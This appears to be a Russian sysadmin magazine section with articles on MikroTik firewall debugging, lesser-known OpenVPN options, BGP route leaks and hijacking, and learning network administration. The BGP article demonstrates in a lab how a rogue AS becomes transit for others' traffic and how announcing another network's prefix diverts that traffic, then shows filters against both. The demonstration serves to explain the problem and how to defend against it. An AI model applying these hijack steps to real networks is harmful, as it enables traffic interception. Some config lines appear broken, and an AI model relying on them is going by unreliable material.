Когда файрвол не работа ет или работает не  так, как подразуме валось
при настрой ке, виноват админ. Магии не быва ет. Первое, на что стоит обра‐
тить внимание при траб лшутинге, — счетчики пакетов. Если счетчик не уве‐
личивается, значит, трафик в него не попада ет. А если трафик не попадает,
значит, либо это го трафика прос то нет, либо он был обработан стоящим
выше правилом.





                              Счетчики

Ты же помнишь, что пра вила файрвола работают по принципу «кто первый
встал — того и тапки»? Если пакет попал под действие правила, то дальше он
уже не пойдет. Значит, нужно искать проблему выше. Прос то копируем наше
правило, action ставим accept (для траблшутинга не делай дроп — так
при проверке можно сло мать себе доступ или нарушить работу сети) и пос‐
тепенно двигаем его наверх до первого увеличения счетчиков в этом пра‐
виле. Если через это правило уже проходил трафик, то счетчики будут ненуле‐
вые и можно пропустить нужные нам пакеты, — просто сбрось счетчики
в этом правиле или во всех кнопками Reset Counters.





                             Reset Counters


/ip firewall filter reset‐counters‐all

или


/ip firewall filter reset‐counters numbers=<номер правила>

Предположим, мы нашли  правило,  в  которое  попадает наш  трафик,
а попадать не дол жен. Нужно понять, почему так происходит. В этом нам
поможет опция Log. Во вкладке Action ста вим галочку Log (можно написать
префикс для правила, чтобы было про ще отлавливать его в логах) и смотрим
логи, где написаны все характеристики пакетов, попадающих под правило.
Среди характеристик: цепочка, входящий и исходящий интерфейсы, адреса
и порты источника и получателя, протокол, флаги, размер пакета, действия
NAT.





                                Лог

Если даже в самом верху в пра виле не будут увеличиваться счетчики, убирай
правила из усло вия по одному. Начинай с интерфейсов — админы часто пута‐
ются в своих представлениях о том, отку да или куда должен идти трафик (нап‐
ример, при коннекте к провайдеру через PPPoE или в туннелях между фили‐
алами или сложном роутинге). Счетчики пошли? Включаем лог и смотрим
интерфейсы и другие параметры.
   Если и это не помогает — пришло время тяжелой артиллерии. Идем
в Tools → Torch и изучаем тра фик на роутере. Может, ожидаемого трафика
вовсе нет. Еще один крутой инс тру мент — аналог tcpdump — Tools → Packet
Sniﬀer. Разбор работы этих инструментов тянет на отдельную статью (если
она тебе интересна — сооб щи об этом в коммента риях к статье).
   Чтобы упростить траблшу тинг, можно использовать функцию комменти‐
рования. Если из‐за комментов окно ста новится слишком большим и это
мешает смотреть на пра вила, воспользуйся инлай новыми комментариями
(Inline Comments). Так комменты вста нут с правилом в одну строку и в окно
будет умещаться больше пра вил.





                                      Inline Comments

Также рекомендую распределять пра вила по порядку, следуя какой‐то опре‐
деленной логике. И старайся ее поддерживать на всех роутерах.


ИТОГИ
В этой статье приведены только основы настройки файрвола и главные
методы диагностики. Кро ме RouterOS, эти принципы применимы и для Linux.
В следующей статье разберем более сложные пра вила, которые позволяют
защититься от не самых прос тых атак, и разберем цепочку Forward, а также
создадим свои цепоч ки.
АДМИН
  НЕИЗВЕСТНЫЙ
 OPENVPN

          ЗНАКОМИМСЯ СО СКРЫТЫМИ
     ВОЗМОЖНОСТЯМИ И НАСТРОЙКАМИ





                                      Даниил Батурин
                             Координатор проекта VyOS (https://vyos.io), «языковед»,
                                функциональщик, иногда сетевой администратор
                                                       daniil@baturin.org




OpenVPN был и остается одним из самых популярных
средств для построения виртуальных частных сетей. Он
не лишен недостатков: для него нет встроенного клиента
в Windows, macOS и мобильных устройствах, а пропускная
способность туннелей не слишком высока. Зато способ‐
ность работать поверх TCP позволяет ему проходить даже
через самые безумные сети с многократным NAT и прочим
издевательством.


В интернете полно статей о настройке сервера OpenVPN для подключения
пользовательских компь ютеров к уда лен ной сети, и создается впе чатление,
что это его единственное применение. Кто‐то даже считает, что с появлением
WireGuard он вов се утратил свою акту альность. Дей ствительно, встроенный
роуминг  и  другие  возможности  WireGuard  соз дают  старым  проектам
серьезную конкуренцию.
  Однако в OpenVPN есть много менее извес тных возможностей, и он все
еще остается одним из самых гибких, многофункциональных и простых в нас‐
тройке решений.
  Я предполагаю, что у тебя уже есть опыт нас тройки OpenVPN, поэтому
пропустим основы и сразу перейдем к малоизвес тным полезным фичам.


SITE TO SITE
OpenVPN обычно ассоциируется с настройками типа клиент — сервер. Боль‐
шинство статей посвящены именно это му варианту, и многие сетевые дис‐
трибутивы вроде OpenWRT и OPNSense предоставляют пользовательский
интерфейс только для него. Но это большое упу щение! OpenVPN — очень
простой способ соеди нить два хоста или сети безопасным туннелем типа
точка — точка.
  Еще менее известный факт: в этом режиме OpenVPN может работать
со статическими клю чами (pre‐shared key), без сертификатов. Более того,
чтобы сге нерировать такой ключ, тебе не понадо бит ся никаких инструментов,
кроме самого OpenVPN.
  Предположим,  что мы хотим пос тоянное подключение  к  удаленной
машине с адресом 203.0.113.100. Сгенерируем ключ:


$ openvpn ‐‐genkey ‐‐secret /etc/openvpn/shared.key

Настроим локальную сторону:


dev‐type tun
dev tun0
ifconfig 192.168.0.2 192.168.0.1
rport 1194
remote 203.0.113.100
secret /etc/openvpn/shared.key

Теперь скопируем файл ключа на уда лен ную машину и напишем там противо‐
положный конфиг:


dev‐type tun
dev tun0
ifconfig 192.168.0.1 192.168.0.2
lport 1194
local 203.0.113.100
secret /etc/openvpn/shared.key

По желанию можно добавить туда опции для работы в режиме демона:


daemon openvpn‐tun0
writepid /var/run/openvpn‐tun0.pid

Осталось сохранить конфиг в файл вроде /etc/openvpn/s2s.conf и запус‐
тить openvpn ‐‐config /etc/openvpn/s2s.conf.
  Идентификация соединений про исходит только по ключу, адре са хостов
никак не учитываются. Указать опцию remote нужно только на одной сто‐
роне — «клиенте». Сторона без опции remote будет ждать под ключения.
Из‐за этого OpenVPN удобен для соеди нений site to site с хостами, у которых
нет статического адреса, и даже хостами за NAT.
  Опция local не обязательна, но полез на для маршрутизаторов с несколь‐
кими внешними интерфейсами. Если ее не указывать, OpenVPN будет слу‐
шать на 0.0.0.0.
  OpenVPN работает поверх UDP, если не указано обратное. Если хочешь
использовать TCP, на стороне «клиента» нужно добавить в конфиг proto
tcp‐client, а на стороне «сервера» — proto tcp‐server.
  Насколько плохо исполь зование ста тических клю чей? С одной стороны,
утечка такого ключа куда более опас на, пос коль ку злоумышленник сможет
расшифровать весь перехваченный тра фик, и в прошлом, и в будущем. TLS
решает эту проблему использованием сес сионных ключей. Но с другой сто‐
роны, такой трафик сложнее идентифицировать как зашифрованный туннель.
  Режим site to site можно использовать с TLS и сертификатами, но настрой‐
ка этого сложнее и требует больше времени. Если тебе нужно поднять соеди‐
нение между двумя машина ми с минимальными затратами усилий, OpenVPN
site to site со статическим ключом — оптимальный вариант.


РАЗДАЕМ РАЗНЫЕ НАСТРОЙКИ РАЗНЫМ КЛИЕНТАМ
Динамическая маршрутиза ция — это здорово, но совершенно непрактично
для  клиентских  соединений.  Даже  для  туннелей  к  маршру тизаторам
это может быть непрактично, если они работают на какой‐нибудь OpenWRT,
где нет удобного механизма для ее нас трой ки. Вручную нас троить FRRouting
или BIRD можно на любой UNIX‐подоб ной ОС, но нуж но ли?
  С OpenVPN решить эту проблему прос то. Все слышали про опции push
в конфиге самого сервера, вроде push "route 172.16.20.0 255.255.255.
0". Меньше людей знают, что эти нас трой ки могут быть не только глобаль‐
ными. Более того, поч ти любые опции можно ука зать на уровне клиентов.
   Чтобы иметь возможность задавать настройки отдельным клиентам, нужно
указать каталог для файлов с этими нас трой ками:


client‐config‐dir /etc/openvpn/client‐configs/

Для идентификации клиентов используется поле CN (Common Name) из их
сертификатов. Предположим, у тебя есть клиент с CN=jrandomuser и ему
нужен доступ к сети 172.16.19.0/24.
  Достаточно создать файл /etc/openvpn/client‐configs/jrandomuser
и прописать туда опцию


push "route 172.16.19.0 255.255.255.0"

Таким же образом можно избирательно отключить split tunneling для некото‐
рых клиентов, если прописать им push "route 0.0.0.0 0.0.0.0".
  Кроме маршрутов, мож но раздавать множество других опций. Например,
задать клиентам свой сервер DNS: push "dhcp‐option DNS 172.16.0.10".
Можно указать и сервер WINS, если клиенту нужен доступ к SMB: push
"dhcp‐option WINS 172.16.0.10".
  Возможность указывать все это как глобально, так и для отдельных кли‐
ентов позволяет весьма гибко управлять доступом пользователей к внут‐
ренней сети без особых усилий.


             INFO

                    OpenVPN  читает  файлы  клиентских  настроек
                      при каждом их подключении. Переза пускать его,
                         что бы добавить новых клиентов или поменять
                       настройки, не нужно.



ПОДКЛЮЧАЕМ УДАЛЕННЫЕ СЕТИ
Режим site to site хорош для небольшого чис ла соединений. Если у тебя
десятки или сотни удаленных сетей, нас траивать туннель к каждой крайне уто‐
мительно. Можно  авто матизировать  этот процесс  с помощью  Ansible
или чего‐то еще, но в OpenVPN есть встро енный механизм для этой задачи.
  Предположим, что сеть твоей орга низа ции — 10.0.0.0/16, а для удален‐
ных клиентов у тебя выделена 10.0.0.0/21. Пусть твой сервер OpenVPN
использует сетевой интерфейс tun0.
  Прежде всего нужно создать маршрут ко всей сети через этот интерфейс.
В Linux команда будет такой:


$ sudo ip route add 10.0.0.0/21 dev tun0

Тонкий момент: ядро Linux уда ляет маршру ты, когда интерфейс исчезает
или уходит в down. По этой причине нуж но сделать, чтобы этот маршрут соз‐
давался при перезапуске OpenVPN. Самое чистое решение — использовать
демон маршрутизации вро де Quagga/FRRouting или BIRD, который сам сле‐
дит за состояниями сетевых интерфейсов и пересоздает маршруты по необ‐
ходимости. Самое простое — добавить команду в скрипт запуска.
  Одну подсеть мы выделим для клиентских интерфейсов и укажем ее
в опции server. Кроме того, нуж но указать в конфиге topology subnet. Что‐
бы указывать, какая сеть какому клиенту принадлежит, нам снова понадобит‐
ся client‐config‐dir.
  Разумеется, клиентам пот ребуется доступ к корпоративной сети, поэтому
мы выдадим им маршрут к 10.0.0.0/16 с помощью push.
  Добавим сле дующее в конфиг сервера:


server 10.0.0.0 255.255.255.0
topology subnet
persist‐tun


client‐config‐dir /etc/openvpn/client‐configs/


push "route 10.0.0.0 255.255.0.0"

Теперь создадим конфиг клиента. Предположим, ты хочешь подключить офис
с сетью 10.0.1.0/24 и ты создал для его маршрутиза тора сертификат с CN=my‐
remote‐office.
  Пропиши следующее в /etc/openvpn/client‐configs/my‐remote‐of‐
fice:


iroute 10.0.1.0 255.255.255.0

Теперь,   когда   этот   клиент   под ключится,  OpenVPN   ассоциирует
сеть 10.0.1.0/24 с его подключением.


ХРАНИМ ВСЕ НАСТРОЙКИ КЛИЕНТА В ОДНОМ ФАЙЛЕ
Очень часто можно получить от удален ной стороны конфиг OpenVPN для под‐
клю чения к серверу и отдельные файлы с CA, клиентским сертификатом
и ключом. Это приемлемо для админов, но крайне неудобно для конечных
пользователей.
  К счастью, ключи и сертификаты можно хра нить вместе с настройками.
Например:


client
dev tun
proto udp
remote 203.0.113.20 1194


<ca>
‐‐‐‐‐BEGIN CERTIFICATE‐‐‐‐‐
...
‐‐‐‐‐END CERTIFICATE‐‐‐‐‐
</ca>
<cert>
‐‐‐‐‐BEGIN CERTIFICATE‐‐‐‐‐
...
‐‐‐‐‐END CERTIFICATE‐‐‐‐‐
</cert>
<key>
‐‐‐‐‐BEGIN RSA PRIVATE KEY‐‐‐‐‐
...
‐‐‐‐‐END RSA PRIVATE KEY‐‐‐‐‐
</key>

Пользователю достаточно сохранить этот файл (к примеру, в my‐vpn.ovpn)
и запустить openvpn ‐‐config my‐vpn.ovpn или указать этот файл в гра‐
фическом интерфейсе клиента.


ОБЩАЕМСЯ С ПРОЦЕССОМ OPENVPN ЧЕРЕЗ СОКЕТ
OpenVPN предоставляет интерфейс, через который ты можешь просмотреть
информацию о подключениях и выполнить ряд адми нистративных задач. Вза‐
имодействовать с ним можно через сокет: либо TCP/IP, либо UNIX.
   Есть вариант подключаться к сокету IP через Telnet. Это удобно, но нужно
следить за безопасностью дос тупа к этому сокету. Обеспечить безопас ность
UNIX domain socket куда проще, поэто му мы выберем именно этот способ.
  Нужно добавить в конфиг сервера следующее:


management /tmp/openvpn‐mgmt unix

Подключиться к этому сокету можно с помощью утилиты socat:


$ sudo socat ‐ UNIX‐CONNECT:/tmp/openvpn‐mgmt
>INFO:OpenVPN Management Interface Version 1 ‐‐ type 'help' for more
info

В выводе help ты найдешь целый ряд полезных команд. К примеру, kill
jrandomuser принудительно разорвет все подключения клиента с CN=jrando‐
muser. В выводе команды status можно увидеть информацию о всех текущих
подклю чениях.
   Если тебя интересует именно информа ция о клиентских туннелях и ты
хочешь получать ее без необходимости каждый раз под ключаться к сокету,
можешь добавить вот эту опцию в конфиг:


status /tmp/openvpn.status

Данные в файл /tmp/openvpn.status будут писать ся в таком же формате,
как вывод коман ды status, вро де:


OpenVPN CLIENT LIST
Updated,Tue Apr 21 12:45:47 2020
Common Name,Real Address,Bytes Received,Bytes Sent,Connected Since
jrandomuser,192.0.2.57:56422,51036248,505028963,Tue Apr 21 08:04:02
2020


ЗАКЛЮЧЕНИЕ
В документации к OpenVPN отыщется и много других интерес ных воз можнос‐
тей. К примеру, если указать несколько опций remote в конфиге клиента, кли‐
ент автоматически переключится на следующий адрес сервера, если не смо‐
жет подключиться к первому.
  Именно гибкость нас тройки и раз нооб разие опций поз воляют OpenVPN
успешно конкурировать с дру гими похожи ми про ектами.
АДМИН
BGP
 ROUTE LEAKS

   РАЗБИРАЕМСЯ С ЭФФЕКТОМ БАБОЧКИ
                В ГЛОБАЛЬНОЙ СЕТИ





      Алексей Киселев
     k.alexey360@gmail.com





Все крупные сети и особен но сети провайдеров строятся
на одном протоколе — BGP. Сегодня мы рассмотрим с тех‐
нической стороны один из глав ных недостатков BGP: полное
отсутствие проверки полученных маршрутов. Из‐за этого
возможна  уязвимость,  которая  называется  route  leak
или «утечка маршрутов».


Сам по себе BGP никак не защищен от воздей ствий извне. Eжедневно про‐
исходят десятки и сотни случаев утечки маршрутов, и сказать наверняка, была
это спланированная атака или ошибка в конфигура ции, невозможно. Часть
трафика попадает из сетей магистральных провайдеров в неизвес тность.
  Ты легко сможешь найти ботов и сайты, на которых час тенько всплывают
сообщения о route leaking или hijacking.
   Route leak чаще случается из‐за ошиб ки в конфигурации, неверной либо
полностью отсутствующей фильтра ции на стыке с вышестоящим провай‐
дером. В этой статье я буду подразумевать, что route leaking — транзитное
перенаправление трафика через сторонние автономные сис темы, hijacking —
анонсирование чужих префиксов из AS (Autonomous System), которым он
не должен принадлежать.


ЧЕМ ОПАСЕН ROUTE LEAK
Route  leaking и  hijacking вызывают неп риятности: иногда это задержки,
а порой и атаки DOS или MITM.
   Чтобы разобраться, как возника ет route leak, необ ходимо понять основные
механизмы работы BGP, пос кольку утечка вызыва ется без каких‐либо допол‐
нительных манипуляций.
  BGP использует номера авто номных систем, и по этому критерию выделя‐
ют iBGP и eBGP. Разница в том, что iBGP (internal) работает в пределах одной
автономной системы, eBGP (external) — между разными. Сейчас нас инте‐
ресует eBGP: route leak происходит из‐за неверных настроек между пирами
eBGP.


Пре дотвращение петель маршру тизации
Для предотвращения петель маршрутизации пиры BGP проверя ют атрибут AS
PATH. Если в AS PATH есть собс твенный номер AS — роутер его отбрасывает.
Это и есть петля.
  Для пиров eBGP действу ет правило: при получении сообщения UPDATE,
в котором хранится информа ция о маршру тах, следует передать сообщение
всем пирам BGP. Для пиров iBGP номер AS не меняется, сообщение UPDATE
не передается другим пирам. Это стандартный механизм.


Вы бор луч шего пути
BGP использует алго ритм из нескольких шагов (от десяти до тринадцати).
В зависимости от вендора и информа ции о доступности сетей через нес‐
колько источников протокол выбира ет только один  путь, помещает его
в локальную таблицу маршру тиза ции и переда ет своим пирам.
   Есть много способов повлиять на этот выбор. Сейчас мы остановимся
на атрибуте AS PATH. Он состоит из последовательности номеров, каждая
автономная система добавляет в поле UPDATE сооб щения номер своей AS
в порядке очереди.



  R1#show ip bgp


  Network          Next Hop            Metric LocPrf Weight Path
  *   172.16.0.0/24    30.0.0.1                               0 2 3 4 i
  *>                   10.0.0.2                               0 5 4 i


В этом примере роутер выберет второй путь: при прочих равных путь через
этот источник короче. Этот процесс можно сравнить с платной дорогой.
Представь, что до твоего места наз начения две дороги: на одной три пункта
оплаты проезда, на второй два, цены на обоих одинаковы.


             INFO

                    Номер public AS получить не так просто. Нужно
                      предоставить веские основания для IANA. Но это
                       вопрос бюрократический, а мы сделаем упор
                       на техническую часть.


Отсюда вытекает процесс  route  leak — эффект бабочки: чистый BGP
без фильтров может быть крайне опасен и нарушить оптимальные пути тра‐
фика.


Прак тика
R1 и R4 выступают в качестве пограничных про вайдерских роутеров, оба
маршрутизатора анонсируют сети 192.168.0.0/24 и 172.16.0.0/24 соот‐
ветственно из своих AS 1 и 2. У каждого про вайдера есть договоренность
с магистральными провайдерами (R2 и R3) о том, что R1 и R4 будут перего‐
нять трафик через них, а AS 2 и 3 обеспечат нужную пропускную способность,
надежность и защиту.





  Зеленым цветом обозначен оптимальный со стороны провайдера путь
  трафика, красным — трафик, который прой дет через стороннюю AS, выз ‐
  вав эффект route leak

Мы подключим в эту схему провайдера R5. Теперь мы можем, изменив длину
AS path, стать транзитной AS для трафика меж ду AS 1 и 2, пропустить через
себя весь трафик и выз вать кучу неприятностей и головной боли для всех
провайдеров в цепи.
  Мы имеем доступ только до R5. R1 и R4 настроили пиринг до адре сов 10.
0.0.2 и 20.0.0.2 соот ветственно.
   Классический случай для route leaking. Новая автономная сис тема име ет
как минимум два пира с раз ными AS: route leak подразумевает возможность
транзита.
  Настраиваем пиринг с провайдерами.
   Конфигурация R1 и R4:


R1
Interface eth0/0
  Ip add 10.0.0.1 255.255.255.0
  No shutdown
Interface eth0/1
  Ip add 30.0.0.1 255.255.255.0
  No shutdown
router bgp 1
  network 192.168.0.0
  neighbor 10.0.0.2 remote‐as 5
  neighbor 30.0.0.2 remote‐as 2


R4
Interface eth0/0
  Ip add 20.0.0.1 255.255.255.0
  No shutdown
Interface eth0/1
  Ip add 40.0.0.1 255.255.255.0
  No shutdown
router bgp 4
  network 172.16.0.0
  neighbor 20.0.0.2 remote‐as 5
  neighbor 40.0.0.2 remote‐as 3

Проверяем таблицу маршрутизации от R1 до сетей R4:



  R1#show ip route 172.16.0.0
  Routing entry for 172.16.0.0/24, 1 known subnets
  B        172.16.0.0 [20/0] via 30.0.0.1, 00:05:54


  R1#show ip bgp 172.16.0.0
  BGP routing table entry for 172.16.0.0/24, version 4
  Paths: (1 available, best #1, table default)
  Not advertised to any peer
  Refresh Epoch 1
  2 3 4
  30.0.0.1 from 30.0.0.1 (50.0.0.1)
  Origin IGP, localpref 100, valid, external, best
  rx pathid: 0, tx pathid: 0x0


  PC_1> trace 172.16.0.10


  trace to 172.16.0.10, 8 hops max, press Ctrl+C to stop
  1   192.168.0.1   0.394 ms  0.247 ms  0.256 ms
  2   30.0.0.1   0.568 ms  0.498 ms  0.395 ms
  3   50.0.0.2   0.645 ms  0.722 ms  0.634 ms
  4   40.0.0.2   0.917 ms  0.651 ms  0.750 ms
  5   172.16.0.10   1.111 ms


Переходим к конфигурации с R5:


R5
R5
Interface eth0/0
  Ip add 10.0.0.2 255.255.255.0
  No shutdown
router bgp 5
  neighbor 10.0.0.1 remote‐as 1

Получаем маршруты от провайдера R1 и перехо дим к конфигурации с про‐
вайдером R4.


R5
R5
Interface eth0/1
  Ip add 20.0.0.1 255.255.255.0
  No shutdown
router bgp 5
  neighbor 20.0.0.2 remote‐as 4

Аналогичным образом, получив таблицу маршру тов от провайдера R4,
R5 запустил свой расчет и посчитал, как быстрее всего добираться до каждой
сети в нашем примере.
  Маршрутизаторы R1 и R4, которые выступают в нашем примере в качестве
провайдеров, тоже получили сообщения UPDATE от маршру тизатора R5.
Запустили алгоритм выбора лучшего маршрута в BGP (BGP best path selec‐
tion) и добавили маршрут R1 — R5 — R4 как лучший в свою локальную таб‐
лицу маршрутизации.
   Так мы стали транзитным провайдером для трафика из сетей 192.168.0.0
и 172.16.0.0.
  Мы видим следующее:



  R1#show ip bgp 172.16.0.0
  BGP routing table entry for 172.16.0.0/24, version 5
  Paths: (2 available, best #1, table default)
  Advertised to update‐groups:
  1
  Refresh Epoch 1
  5 4
  10.0.0.2 from 10.0.0.2 (20.0.0.1)
  Origin IGP, localpref 100, valid, external, best
  rx pathid: 0, tx pathid: 0x0
  Refresh Epoch 1
  2 3 4
  30.0.0.1 from 30.0.0.1 (50.0.0.1)
  Origin IGP, localpref 100, valid, external
  rx pathid: 0, tx pathid: 0


  R1#show ip route 172.16.0.0
  Routing entry for 172.16.0.0/24, 1 known subnets
  B        172.16.0.0 [20/0] via 10.0.0.2, 00:01:39
  R6#


Теперь мы видим, что трафик идет через AS 5.
  На первый взгляд, не про изошло ничего необычного, стандартный алго‐
ритм BGP. Но никто не хочет, чтобы его тра фик шел через сторонние AS.
Всплывает ряд проб лем: uplink до провайдеров может не справиться с про‐
пускной способностью, воз никнут задержки, трафик может быть перехвачен
и зазеркален.
   Чтобы предотвратить такие ситуации, провайдеры должны нас траивать
community или фильтры ip prefix list для контро ля за получением и отда‐
чей трафика. Но потери или угон тра фика все равно случаются.


BGP HIJACKING
В случае BGP hijacking нам не обязательно быть транзитной AS, от нас тре‐
буется просто анонсировать из своей AS чужие сети.


R7(config)#interface loopback 0
R7(config‐if)#ip address 192.168.0.2 255.255.255.0


R7(config)#router bgp 7
R7(config‐router)#network 192.168.0.0 mask 255.255.255.0

Теперь ближайшие AS примут наш UPDATE и ста нут пересы лать трафик в нашу
автономную систему. Мы получим доступ до всего трафика, адреса наз‐
начения которого находятся в сети 192.168.0.0/24.
  Сети провайдера защищены от хайджекин га, они просто не принимают
маршруты, маска которых больше /25.


КАК ИЗБЕЖАТЬ ROUTE LEAK
Провайдеры стараются обезопа сить себя от воз можных утечек и хайджекинга
с помощью атрибутов community и фильтров RegEx (регулярные выражения).


             INFO

                    Использование community справедливо, только
                          когда оба маршрутизатора име ют договорен‐
                       ности по комьюнити. Однако чаще всего, как и
                        в нашем примере, это не работает, поскольку
                       используется чистый BGP.


Другое примене ние RegEx — использовать его как очень мощный фильтр,
который позволяет заглянуть в анонсы BGP и по присутствию или отсутс твию
определенных AS отбрасывать или, наоборот, принимать маршру ты. Но нель‐
зя предусмотреть все, поэто му лучшим и самым ответственным решением
будет внимательно смотреть, что и куда ты анонсиру ешь из своей AS.


Отфильтро вать все лиш нее
Необходимо настроить фильтра цию, чтобы префиксы, полученные от одного
провайдера, не анонсировались дру гому и наша AS не стала транзитной.
   Взгляни на пример route policy для запрета анонса сетей пер вого про‐
вайдера через второго:


!
router bgp 5
 neighbor 10.0.0.1 remote‐as 1
 neighbor 10.0.0.1 route‐map TO_1 out
 neighbor 20.0.0.2 remote‐as 4
 neighbor 20.0.0.2 remote‐as TO_4 out
!
ip as‐path access‐list 1 deny _4$
ip as‐path access‐list 1 permit .*
ip as‐path access‐list 2 deny _1$
ip as‐path access‐list 2 permit .*
!
route‐map TO_1 permit 10
 match as‐path 1
!
route‐map TO_4 permit 10
 match as‐path 2
!

До фильтра:



  R4#show ip bgp
  Network          Next Hop            Metric LocPrf Weight Path
  *>  172.16.0.0/24    0.0.0.0                  0         32768 i
  *>  192.168.0.0      20.0.0.1                               0 5 1 i
  *                    40.0.0.1                               0 3 2 1 i


После фильтра:



  R4#show ip bgp
  Network          Next Hop            Metric LocPrf Weight Path
  *>  172.16.0.0/24    0.0.0.0                  0         32768 i
  *>  192.168.0.0      40.0.0.1                               0 3 2 1 i


Так мы получаем полный дос туп к таблице маршру тизации от двух провай‐
деров, не став транзитной AS.
  Наш пример в очередной раз доказывает, нас коль ко опасны и непред ска‐
зуемы могут быть любые изменения в маршрутиза ции BGP.
  Мы рассмотрели route leak и hijacking на очень скромном примере, однако
и в глобальных сетях мировых магистральных про вай деров похожее происхо‐
дит чуть ли не ежедневно. Если тебе интерес но, почитай про Ростелеком,
Google, AWS, Cloudﬂare и China Telecom.
АДМИН


 СТАНЬ
  СИСАДМИНОМ!
     ГДЕ И КАК УЧИТЬСЯ СЕТЕВОМУ
       АДМИНИСТРИРОВАНИЮ





Многие представ ляют сисадмина как маль‐
чика, который по требова нию начальника
вытаскивает  из  прин тера  застряв шие
                                                                          Валерий Линьков
                                                                                  Дипломированныйбумажки. На самом деле профессия сис‐                                                                                    специалист и инструктор Cis‐
                                                                                                co, основатель академии Cis‐темного  администра тора  подразуме вает                                                                                                co, автор технических статей
                                                                                     нацбезопасности России,наличие неплохого багажа теоретических                                                                                        сисадмин, ИБшник,
знаний и практических навыков. Это му нуж‐              питонист, гик                                                                                                                   valerylinkov.ru
но учиться. Давай посмотрим, где и как
это можно делать.


ДОШКОЛЬНОЕ ОБУЧЕНИЕ И НАЧАЛЬНАЯ ШКОЛА
С какого возраста изучать технологии? Чем раньше — тем лучше! Сей час
двухлетние дети вовсю возят ся с планшетами, так что годам к шести уже
вполне можно приступать к программированию.
  Для начала идеально подойдет ScratchJR, его реализация есть почти
на любых платформах, включая iOS и Android. Это графический язык прог‐
раммирования, на котором можно и программу написать, и игру создать,
и даже реализовать какой‐нибудь более серьезный проект.
  Следом можно переходить к Scratch. Могу порекомендовать курс «Прог‐
раммируем на Scratch» и книги Дениса Голикова. Их особенность заключа‐
ется в том, что по ним юный программист может изучать Scratch самос‐
тоятельно, без участия взрослых, главное — уметь читать.
  Еще одна штуковина, с которой можно зна комиться с юного возраста, —
плата Arduino. На мой взгляд, лучшая книга по этой платформе — «Практичес‐
кая энциклопедия Arduino» Петина и Биняковско го (на данный момент акту‐
ально второе издание 2019 года). Встречаются и наборы из платы и книги.
Например, «Scratch + Arduino. Набор для юных конс трукторов» и «Scratch +
Arduino. 18 проектов для юных прог раммистов + книга».
   Также можно глянуть конструкторы «Знаток».


СТАРШИЕ КЛАССЫ
Изучающие информатику в школе делятся на две группы: те, кому повез ло,
и все остальные. Везунчики изучают язы ки прог раммирования, основы сетей,
устройство компьютера и многое дру гое. Те, кому повезло меньше, рисуют
в Paint и набирают тексты в Word. Лучше чем ничего, но все же для будуще го
IT‐специалиста этого мало.
   Лет с двенадцати человек уже сам понимает, что ему больше всего инте‐
ресно, и если это компь ютеры, то родителям стоит позаботиться, чтобы он
получил нормальное техническое образование. При этом оценки по матема‐
тике и информатике вов се не показатель, поскольку тут очень многое зависит
от учителя и его умения заинтересо вать школьников своим пред метом.


             INFO

                   В 2017 году в школах появилось два интересных
                       нововведения. Первое — проект мэрии Москвы
                            «Ин женерный класс в московской школе». Вто рая
                      новин ка — предмет «Проектная деятельность»,
                       на котором можно трудиться над какой‐то своей
                       разработ кой. Крутой проект может стать даже
                       частью будущего резюме.



Как выбирать курсы
Сейчас полно курсов, на которых школьник может получить допол нительные
знания. Увы, часто эти курсы совершенно бесполез ны. Дело в том, что многие
из них — это, по сути, кружки научно‐развлекательного толка. У преподавате‐
лей там три виально свя заны руки: им зап рещено давать подопечным серь‐
езную нагрузку. Из‐за это го невозможно вести занятия в форме лекций
или уроков, давать домашние задания или устра ивать тестирование.
   Иногда талантливым педагогам уда ется донес ти до школьников знания
в игровой и развлекательной форме, не нап рягая их обя заловкой, но часто
в таких кружках дети просто бестолково проводят время. Ценные знания
здесь получает толь ко тот, кто готов занимать ся сам.
  Однако все это не зна чит, что хороших школ, способных не только раз‐
влечь детей, но и дать им полезные зна ния, нет. Вот несколько примеров.
 • Cisco Networking Academy. Моя родная академия, в которой я начал свой
   путь и сейчас помогаю начать другим. Главный плюс академии — обновля‐
  емые раз в два года кур сы по сетевому админис трированию. Формы про‐
   верки — контроль ные и экзамены. Возраст — от 12 лет (иногда с 10 лет).
 • Школа Huawei. Школа, которая появилась не так давно (лет десять назад),
   но уже успела «наделать шуму». Это аналог академии Cisco на китайский
   лад. Курсы здесь более дешевые, но они крайне полез ны для России, так
   как у нас оборудование Huawei встречается все чаще. Формы проверки —
   контрольные и экзамены. Воз раст — от 12 лет.
 • IT‐школа Samsung. Еще одна прекрасная школа, расположенная в Москве.
   Здесь изучается Android‐программирова ние на Java. Эта тема напрямую
   не относится  к системному адми нистрированию, тем не менее она
   популярна у подрос тков. Формы проверки — контрольные, экзамены,
   зачеты. Не сдал зачет — закончил обучение. Возраст — от 14 до 17 лет.
  В отличие от предыдущих двух школ здесь обучение ведется в офлайне.

В общем, выбирай с умом! Нужно искать школы, которые давно на рынке,
желательно международные и с системой зачисления по результатам пред‐
варительных тестов. Кстати, тес тирование — это не прос то дополнительный
стресс: лучше один раз завалить тест, чем страдать целый год, ничего
не понимая на занятиях.
   Также обязательно смотри, кто учитель. Если его имя и фамилия не гуг‐
лятся — это плохой знак. Воз можно, стоит лично пообщаться с педагогами
и выяснить,  что и  как  будут препода вать. А  вот обращать внимание
на выложенные в интернете на официальном сайте сертификаты и бла‐
годарственные письма нет смысла вовсе.


Что изу чать?
При выборе школы или составлении плана домашних занятий отдавать пред‐
почтение стоит базовым знаниям, которые при годятся любому айтишнику.
За время обучения модные технологии успеют измениться, но некоторые
вещи пригодятся всегда:
 • устройство и прин ципы работы компь юте ра;
 • основы сетей;
 • операционные системы (Windows и Linux);
 • основные принципы информационной безопас ности;
 • концепция виртуализации;
 • английский язык (это вообще ключ ко всему).

Дополнительно можно познакомиться с программированием и веб‐раз‐
работкой — хотя бы на уровне установки и настройки движка сайта.


Самооб разование
Есть огромное количество ресурсов, которые поз воляют изучить основы IT, —
как бесплатных, так и платных. А иногда и на платных кое‐что дают задаром.
  Например, Stepik.org — прекрасный пор тал с большим количеством бес‐
платных курсов (в том числе на рус ском), оценками и демонстрацией процес‐
са обучения. Из интерес ных нап равлений можно отметить сле дующие:
 • Основы IoT на ArduinoUno;
 • Веб‐разработка для начина ющих: HTML и CSS;
 • Безопасность в интернете;
 • Безопасность АСУ ТП. Вводный курс;
 • Программирование на Python;
 • Анализ безопасности веб‐про ектов;
 • Введение в Linux;
 • Основы программирования для Linux.

Есть и другие. Российские —  «Нетология», GeekBrains,  «Специалист»,
Skillbox, западные — Coursera, Skillshare, Udemy и прочие. Отдельного упо‐
минания заслуживает Khan Academy, которая не берет денег и способна
